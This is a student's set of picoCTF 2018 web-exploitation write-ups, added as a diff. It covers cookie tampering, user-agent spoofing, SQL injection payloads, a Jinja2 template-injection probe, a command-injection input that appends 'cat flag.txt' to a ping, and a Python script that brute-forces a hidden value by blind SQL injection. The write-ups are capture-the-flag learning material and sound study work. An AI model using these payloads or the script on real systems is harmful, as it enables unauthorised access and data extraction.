@@ -1,0 +1,393 @@
+===================================================================
+Inspect Me
+
+	Link brings you to a page with two tabs: Intro and About. No links under either.
+
+	Viewing the page source under Intro:
+
+		</p>
+		<!-- I learned HTML! Here's part 1/3 of the flag: picoCTF{ur_4_real_1nspe -->
+	      </div>
+
+	Also we can see in the html:
+
+		<link rel="stylesheet" type="text/css" href="mycss.css">
+    	<script type="application/javascript" src="myjs.js"></script>
+
+    This tells us that there is a stylesheet linked and javascript is used
+
+    Inspecting the css:
+
+    	/* I learned CSS! Here's part 2/3 of the flag: ct0r_g4dget_098df0d0} */
+
+	Inspecting the javascript:
+
+		/* I learned JavaScript! Here's part 3/3 of the flag:  */
+
+	Flag:
+		picoCTF{ur_4_real_1nspect0r_g4dget_098df0d0}
+
+===================================================================
+Client Side is Still Bad
+	
+	Solve:
+		I forgot my password again, but this time there doesn't seem to be a reset, can you help me? http://2018shell.picoctf.com:55790
+
+	Hint:
+		Client Side really is a bad way to do it
+
+	Link brings us to a web page with an input space and a 'login' button. 
+
+	Inspecting the page source:
+				<script type="text/javascript">
+		  function verify() {
+		    checkpass = document.getElementById("pass").value;
+		    split = 4;
+		    if (checkpass.substring(split*7, split*8) == '}') {
+		      if (checkpass.substring(split*6, split*7) == 'd366') {
+		        if (checkpass.substring(split*5, split*6) == 'd_3b') {
+		         if (checkpass.substring(split*4, split*5) == 's_ba') {
+		          if (checkpass.substring(split*3, split*4) == 'nt_i') {
+		            if (checkpass.substring(split*2, split*3) == 'clie') {
+		              if (checkpass.substring(split, split*2) == 'CTF{') {
+		                if (checkpass.substring(0,split) == 'pico') {
+		                  alert("You got the flag!")
+
+	We can see that the password is actually the flag which is checked seperately, piecing them together gives us the full flag. Entering the flag prompts the message "You got the flag!"
+
+	Flag:
+		picoCTF{client_is_bad_3bd366}
+
+
+===================================================================
+Logon
+	
+	Solve:
+		I made a website so now you can log on to! I don't seem to have the admin password. See if you can't get to the flag. http://2018shell.picoctf.com:5477
+
+	Hints:
+	    Hmm it doesn't seem to check anyone's password, except for admins?
+	    How does check the admin's password?
+
+	Using the hints, trying to use admin/admin to login did not work. However using a random username and a random password will grant us access to the next page with the message:
+
+		Sucess: You logged in! Not sure you'll be able to see the flag though
+							No flag for you
+
+	Going off on the second hint, we can try to look for how the site detects whether the user is admin or not. There was nothing interesting in the javascript or in the packet headers.
+
+	Looking at the cookies however showed something interesting, it contained 3 fields, admin, password and username. We can simply open up Storage Inspector in FireFox and locate the specific cookie and change the admin field from False to True. Refreshing the page which now displays the flag.
+
+	Flag:
+		picoCTF{l0g1ns_ar3nt_r34l_aaaaa17a}
+
+
+===================================================================
+Irish Name Repo
+
+	Solve:
+		There is a website running at http://2018shell.picoctf.com:52012 (link). Do you think you can log us in? Try to see if you can login! 
+
+	Hint:
+		There doesn't seem to be many ways to interact with this, I wonder if the users are kept in a database?
+
+	The hint tells us that we might be able to leak the user data somehow. Using the most basic inject method for SQL. Assuming their structure is :
+
+		SELECT * FROM users WHERE name='admin' AND password='????'
+
+	We can set our username to be 'admin' and password will be 'admin' or '1' = '1'
+	When entered into the input, the SQL query reads the input as
+
+		SELECT * FROM users WHERE name='admin' AND password='admin' or '1' = '1'
+
+	As '1' = '1' will always be true, the web page will always authenticate. Doing so logs us in, displaying the flag.
+
+
+	Flag:
+		picoCTF{con4n_r3411y_1snt_1r1sh_c0d93e2f}
+
+===================================================================
+Mr. Robots
+
+	Solve:
+		Do you see the same things I see? The glimpses of the flag hidden away? http://2018shell.picoctf.com:15298
+
+	Hints:
+		What part of the website could tell you where the creator doesn't want you to look?
+
+	The hint led me to think that there would be something in the CSS or HTML which hid something but neither of those places turned up anything useful.
+
+	However, searching online yielded some interesting results, mainly the Robots exclusion standard (sounds relevevant to the hint). This is also named robots.txt where it is a standard used by websites that communicates with web crawlers (basically giving them instructions). This file is to inform the crawlers which areas of the site should not be scanned. robots.txt is put at the top level directory.
+
+	Knowing this, we can look at /robots.txt:
+		User-agent: *
+		Disallow: /c4075.html
+
+	Since it clearly doesn't want the crawlers to get to c4975.html we can look there, which gives us the flag at http://2018shell.picoctf.com:15298/c4075.html
+
+	Flag:
+		picoCTF{th3_w0rld_1s_4_danger0us_pl4c3_3lli0t_c4075}
+
+===================================================================
+No Login
+
+	Solve:
+		Looks like someone started making a website but never got around to making a login, but I heard there was a flag if you were the admin. http://2018shell.picoctf.com:39670
+
+	Hints:
+		What is it actually looking for in the cookie?
+
+	On the webpage, both Sign In and Sign Out buttons yield "not implemented" messages, while the Flag button gives "I'm ssorry it doesn't look like you are the admin'.
+	Using the hint, we can browse around in the cookies to search for anything admin related fields. However, there was nothing. Perhaps we can simple add a cookie with the field admin=True as it was this format in the previous challenge.
+
+	Doing so retreived the flag
+
+	Flag:
+		picoCTF{n0l0g0n_n0_pr0bl3m_50e16a5c}
+
+===================================================================
+Secret Agent
+
+	Solve:
+		Here's a little website that hasn't fully been finished. But I heard google gets all your info anyway. http://2018shell.picoctf.com:60372
+
+	Hints:
+		How can your browser pretend to be something else?
+
+	The webpage is in the same layout as before, but this time the error message displayed when Flag is clicked:
+
+		"You're not google! Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0 "
+
+	So somehow, we need to edit the header in our packet (User Agent field) so that we appear to be from google. Searching around led me to User Agent Spoofing.
+
+		A user agent is a software that performs actions for the user of a computer (eg IE, Chrome, Firefox). The browser will send out a string, identifying the user agent. This is somtimes spoofed due to restrictions on blocked browsers.
+
+	So we now have to spoof our User Agent so it has a string that links to google. Searching around:
+
+		Googlebot/2.1 (+http://www.google.com/bot.html)
+
+	Using BurpSuite, we can simply intercept the packet and change:
+
+		GET /flag HTTP/1.1
+		Host: 2018shell.picoctf.com:60372
+		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
+		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+		Accept-Language: en-US,en;q=0.5
+		Accept-Encoding: gzip, deflate
+		Referer: http://2018shell.picoctf.com:60372/
+		Connection: close
+		Cookie: _ga=GA1.2.1760984193.1544669250; _gid=GA1.2.1897243008.1546827955; admin=True=value
+		Upgrade-Insecure-Requests: 1
+		Cache-Control: max-age=0
+
+	To:
+
+		GET /flag HTTP/1.1
+		Host: 2018shell.picoctf.com:60372
+		User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html) Gecko/20100101 Firefox/64.0
+		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+		Accept-Language: en-US,en;q=0.5
+		Accept-Encoding: gzip, deflate
+		Referer: http://2018shell.picoctf.com:60372/
+		Connection: close
+		Cookie: _ga=GA1.2.1760984193.1544669250; _gid=GA1.2.1897243008.1546827955; admin=True=value
+		Upgrade-Insecure-Requests: 1
+		Cache-Control: max-age=0
+
+	Forwarding the packet displays the message "Googlebot!" on the page and the flag:
+
+	Flag:
+		picoCTF{s3cr3t_ag3nt_m4n_dc320c11}
+
+===================================================================
+Buttons
+
+	Solve:
+		There is a website running at http://2018shell.picoctf.com:21579 (link). Try to see if you can push their buttons. 
+
+	Hints:
+		What's different about the two buttons?
+
+	This site now has one button which leads to a second link which leads to a page which shows the message
+		"FORM DISABLED. THIS INVIDFENT HAS BEEN LOGGED AND REPORTED TO /dev/null"
+	with the video for Never Gonna Give You Up playing.
+
+	The hint tells us that we should look at the difference between the first and second button which I have pointed out already. The first one is a button where the second one is a link 
+
+	The source for button 1 doesn't contain anything, however the source for button 2 gives us a hint on what to do:
+
+	   <form action="button2.php" method="POST">
+                        FORM DISABLED. THIS INCIDENT HAS BEEN LOGGED AND REPORTED TO /dev/null                  
+       </form>
+
+    From this we can see that button2.php is expecting a POST method, but looking at the packet in BurpSuite, we can see that it is actually sending a GET method so by simple altering the method type and forwarding the packet, we get the flag on the page.
+
+
+	Flag:
+		picoCTF{button_button_whose_got_the_button_ed306c10}
+
+===================================================================
+The Vault:
+	
+	So this webpage displays a username/password login, below that is the source for the login.php. Simply trying the login with random strings yields the message "Login Failed".
+
+	Looking at the login.php source, there are a couple of interesting things:
+
+		1. Uses SQLite3 (potential injection vulnerability)
+		2. Has 3 variables, $username, $password, $debug, $query
+		3. SQL injection is checked 
+
+			  //validation check
+		  $pattern ="/.*['\"].*OR.*/i";
+		  $user_match = preg_match($pattern, $username);
+		  $password_match = preg_match($pattern, $username);
+
+	However, looking at it more closely we can see that there is an error in the code where $username is used to check for SQL injections in the $password. This means that we can still use an injection for the password, we just need to find the username. Using admin as a guess:
+
+		Username: admin
+		password: ' or '1'='1
+
+	Using this displays the flag
+
+	Flag:
+		picoCTF{w3lc0m3_t0_th3_vau1t_e4ca2258}
+
+===================================================================
+Artisinal Handcrafted HTTP 3
+
+	Solve:
+		We found a hidden flag server hiding behind a proxy, but the proxy has some... _interesting_ ideas of what qualifies someone to make HTTP requests. Looks like you'll have to do this one by hand. Try connecting via nc 2018shell.picoctf.com 18685, and use the proxy to send HTTP requests to `flag.local`. We've also recovered a username and a password for you to use on the login page: `realbusinessuser`/`potoooooooo`
+
+	Hints:
+		_Be the browser._ When you navigate to a page, how does your browser send HTTP requests? How does this change when you submit a form?
+
+	Judging from the name and the hint, we can guess that we have to craft a HTTP packet in a specific way.
+
+===================================================================
+Flaskcards (https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
+
+	Solve:
+		We found this fishy website for flashcards that we think may be sending secrets. Could you take a look? 
+
+	Hints:
+	    Are there any common vulnerabilities with the backend of the website?
+	    Is there anywhere that filtering doesn't get applied?
+	    The database gets reverted every 2 hours so your session might end unexpectedly. Just make another user
+
+	Judging from the name of the challange it will have something to do with Flask and jinja2 and from the first hint we can guess that it is another injection vulnerability as it is a common vuln for backends.
+
+	There are 3 pages where we have control of inputs, register/sign in and creating cards.
+	A basic injection to test out whether or not the input is sanitized/vulnerable:
+
+		{{7*'7'}} 
+
+	This will result in the output of 77777777 if the target uses Jinja2 and 49 if the target uses Twig. 
+
+	Testing this at the Sign In resulted in an invalid message, while in the Register page it just registered it as a new user. Lastly is the Card Creation. Using this as both the question and answer successfully created a card. However, when the card is listed back out, both the Question and Answer shows '7777777' which tells us that those inputs are vulnerable.
+
+	So our goal is to be able to access the admin page which means that we should try looking for any data leaks. 
+
+	Using some global variables: config, request, session, g
+	I used each one {{ variable }} and created cards.
+
+	Out of the 4, the one which had the most information was {{config}}
+
+		Question:<Config {'MAX_CONTENT_LENGTH': None, 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_POOL_RECYCLE': None, 'TEMPLATES_AUTO_RELOAD': None, 'JSON_SORT_KEYS': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_NAME': 'session', 'BOOTSTRAP_SERVE_LOCAL': False, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'USE_X_SENDFILE': False, 'SQLALCHEMY_NATIVE_UNICODE': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'JSONIFY_PRETTYPRINT_REGULAR': False, 'SESSION_REFRESH_EACH_REQUEST': True, 'JSONIFY_MIMETYPE': 'application/json', 'SQLALCHEMY_DATABASE_URI': 'sqlite://', 'SESSION_COOKIE_HTTPONLY': True, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'DEBUG': False, 'SQLALCHEMY_ECHO': False, 'SESSION_COOKIE_PATH': None, 'SQLALCHEMY_RECORD_QUERIES': None, 'JSON_AS_ASCII': True, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'SECRET_KEY': 'picoCTF{secret_keys_to_the_kingdom_e8a55760}', 'TESTING': False, 'PREFERRED_URL_SCHEME': 'http', 'BOOTSTRAP_LOCAL_SUBDOMAIN': None, 'ENV': 'production', 'SQLALCHEMY_BINDS': None, 'BOOTSTRAP_USE_MINIFIED': True, 'SESSION_COOKIE_DOMAIN': False, 'TRAP_BAD_REQUEST_ERRORS': None, 'SERVER_NAME': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SQLALCHEMY_POOL_SIZE': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_SAMESITE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'PROPAGATE_EXCEPTIONS': None}> 
+
+	As it turns out, the flag is in the config variable.
+
+	Flag:
+		picoCTF{secret_keys_to_the_kingdom_e8a55760}
+
+
+===================================================================
+
+fancy-alive-monitoring
+
+
+	Hints:
+    	This application uses the validation check both on the client side and on the server side, but the server check seems to be inappropriate.
+    	You should be able to listen through the shell on the server.
+
+    This page simply takes in an IP address and executes 'ping -c 1'.$ip, $cmd_result
+
+    There are also two checks on the IP, one client and one server side as the hint mentions. The clue here is that they are slightly different.
+
+  	Server: 
+  		preg_match('/^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])/',$ip)
+  	VS
+  	Client:	
+  		ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)
+
+  	The subtle difference is that there is no anchor for the server side check (does not have $ at the end). This means that there can be things appended to the back of the IP that won't be checked on the server side. This means that we are able to bypass the client side check completely.
+
+  	This is especially a problem as we can see tat $ip is used in:
+
+  		exec('ping -c 1 '.$ip, $cmd_result)
+
+  	So if $ip were to be : "127.0.0.1; cat flag.txt"
+  	exec() will run ping first and then the next command.
+
+
+
+===================================================================
+A Simple Question
+
+	A simple webpage with a single text input and button, asking for an answer. Entering a random string gives us the next page:
+
+		SQL query: SELECT * FROM answers WHERE answer='a'
+
+			Wrong.
+
+	So we are given the format in which the query is sent. Retrying with a typical SQL injection: 105' or '1'='1
+
+		SQL query: SELECT * FROM answers WHERE answer='105' or '1'='1'
+
+		You are so close.
+
+	This tell us we are on the right track. Looking at the source code, we are told the real source is at /answer2.phps.
+
+		 $con = new SQLite3($database_file);
+		  $result = $con->query($query);
+
+		  $row = $result->fetchArray();
+		 if($answer == $CANARY)  {
+		    echo "<h1>Perfect!</h1>";
+		    echo "<p>Your flag is: $FLAG</p>";
+		  }
+		  elseif ($row) {
+		    echo "<h1>You are so close.</h1>";
+		  } else {
+		    echo "<h1>Wrong.</h1>";
+		  }
+
+	We can see from above that if we are able to get the value of $CANARY, we get the flag. To do this, we can use string matching to determine whether or not the brute force is correct. If the correct string is given, it will give the "you are close" whereas if the guess is incorrect, it will show "wrong". 
+
+	We also know that the page is using SQLite and since we do not know what the character set is , we can simply include all printable characters which includes upper and lower case. Instead of using LIKE as the string matching operator, we can use GLOB, which is case sensitive.
+
+		' or GLOB 'brute_force_guess*
+
+	The * will match any string that starts with brute_force_guess. Writing a simple python script to brute force:
+
+		#!/usr/bin/python3
+
+		import requests
+		import string
+
+		answer = ''
+		for chars in range(50):
+		  for choices in string.printable:
+
+		    bruteforce = "' or answer GLOB '{}*".format(answer+choices)
+		    r = requests.post('http://2018shell.picoctf.com:36052/answer2.php', data = {'answer': bruteforce})
+
+		    if 'so close' in r.text:
+		      answer += choices
+		      print (answer)
+		      break
+
+	Flag:
+		 picoCTF{qu3stions_ar3_h4rd_d3850719}
+
+
+===================================================================
